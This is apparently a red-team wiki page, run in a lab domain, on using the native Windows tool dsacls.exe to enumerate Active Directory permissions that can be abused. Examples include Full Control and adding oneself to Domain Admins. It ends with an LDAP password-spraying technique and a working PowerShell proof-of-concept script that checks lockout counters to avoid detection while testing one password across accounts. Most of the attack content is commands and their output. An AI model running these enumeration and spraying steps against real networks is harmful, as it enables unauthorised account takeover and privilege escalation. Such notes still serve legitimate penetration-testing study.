---
description: Enumeration, living off the land
---

# Enumerating AD Object Permissions with dsacls

It is possible to use a native windows binary (in addition to powershell cmdlet `Get-Acl`) to enumerate Active Directory object security persmissions. The binary of interest is `dsacls.exe`.

Dsacls allows us to display or modify permissions (ACLS) of an Active Directory Domain Services (AD DS).

### Execution

Let's check if user `spot` has any special permissions against user's `spotless` AD object:

{% code title="attacker\@victim" %}
```csharp
dsacls.exe "cn=spotless,cn=users,dc=offense,dc=local" | select-string "spot"
```
{% endcode %}

Nothing useful:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaN6wk26w8-pirzGMzG%2F-LaN7itzG7az7P-wRr6s%2FScreenshot%20from%202019-03-19%2022-46-47.png?alt=media\&token=d28175a1-4438-4de6-afb0-d9fdfcfd153e)

Let's give user spot `Reset Password` and `Change Password` permissions on `spotless` AD object:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaN6wk26w8-pirzGMzG%2F-LaN7_JUpqnM0gcxouwl%2FScreenshot%20from%202019-03-19%2022-46-04.png?alt=media\&token=615d59ba-3ae1-49d1-859c-770808194ef5)

...and try the command again:

{% code title="attacker\@victim" %}
```csharp
dsacls.exe "cn=spotless,cn=users,dc=offense,dc=local" | select-string "spot"
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaN6wk26w8-pirzGMzG%2F-LaN7R50_E37uFhKaILH%2FScreenshot%20from%202019-03-19%2022-44-21.png?alt=media\&token=666696f1-1eca-4ea1-92e4-d28dd7c0913b)

#### Full Control

All well known (and abusable) AD object permissions should be sought here. One of them is `FULL CONTROL`:

{% code title="attacker\@victim" %}
```csharp
dsacls.exe "cn=spotless,cn=users,dc=offense,dc=local" | select-string "full control"
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaN6wk26w8-pirzGMzG%2F-LaN9WENW2egvrpo8X9K%2FScreenshot%20from%202019-03-19%2022-54-36.png?alt=media\&token=dd9ac801-e954-448b-925b-952dc62940af)

#### Add/Remove self as member

{% code title="attacker\@victim" %}
```csharp
dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" | select-string "spotless"
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaN6wk26w8-pirzGMzG%2F-LaNAHL_wSGsVIE5kfa3%2FScreenshot%20from%202019-03-19%2022-57-50.png?alt=media\&token=51eb75b9-e7a9-4755-8752-b9ac7ffa903a)

#### WriteProperty/ChangeOwnerShip

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaN6wk26w8-pirzGMzG%2F-LaNAksNf4H3bPs9BT0t%2FScreenshot%20from%202019-03-19%2023-00-04.png?alt=media\&token=7ed0d8ad-50f7-4191-bc2e-094f48ba6abe)

Enumerating AD object permissions this way does not come in a nice format that can be piped between powershell cmd-lets, but it's still something to keep in mind if you do not the ability to use tools like powerview or ActiveDirectory powershell cmdlets or if you are trying to `LOL`.

For more good privileges to be abused:

### Password Spraying Anyone?

As a side note, the `dsacls` binary could be used to do LDAP password spraying as it allows us to bind to an LDAP session with a specified username and password:

{% code title="incorrect logon" %}
```csharp
dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" /user:spotless@offense.local /passwd:1234567
```
{% endcode %}

![Logon Failure](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaN6wk26w8-pirzGMzG%2F-LaNCrJyr0IcdJ09FfvC%2FScreenshot%20from%202019-03-19%2023-09-12.png?alt=media\&token=083b2f47-b419-47ab-96bd-a7abae23264a)

{% code title="correct logon" %}
```csharp
dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" /user:spotless@offense.local /passwd:123456
```
{% endcode %}

![Logon Successful](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaN6wk26w8-pirzGMzG%2F-LaND3ClUvQm32WwdWmL%2FScreenshot%20from%202019-03-19%2023-09-59.png?alt=media\&token=1f5957dc-f276-423d-bb6f-7dcd4ad11534)

#### Dirty POC idea for Password Spraying:

{% code title="attacker\@victim" %}
```csharp
$domain = ((cmd /c set u)[-3] -split "=")[-1]
$pdc = ((nltest.exe /dcname:$domain) -split "\\\\")[1]
$lockoutBadPwdCount = ((net accounts /domain)[7] -split ":" -replace " ","")[1]
$password = "123456"

# (Get-Content users.txt)
"krbtgt","spotless" | % {
    $badPwdCount = Get-ADObject -SearchBase "cn=$_,cn=users,dc=$domain,dc=local" -Filter * -Properties badpwdcount -Server $pdc | Select-Object -ExpandProperty badpwdcount
    if ($badPwdCount -lt $lockoutBadPwdCount - 3) {
        $isInvalid = dsacls.exe "cn=domain admins,cn=users,dc=offense,dc=local" /user:$_@offense.local /passwd:$password | select-string -pattern "Invalid Credentials"
        if ($isInvalid -match "Invalid") {
            Write-Host "[-] Invalid Credentials for $_ : $password" -foreground red
        } else {
            Write-Host "[+] Working Credentials for $_ : $password" -foreground green
        }        
    }
}
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LaNKkYmPfGSF80_tQUx%2F-LaNQokIjU3XkqUj39tP%2FScreenshot%20from%202019-03-20%2000-10-10.png?alt=media\&token=623bc176-aebd-4293-b12a-c01ff6d0724d)

### References
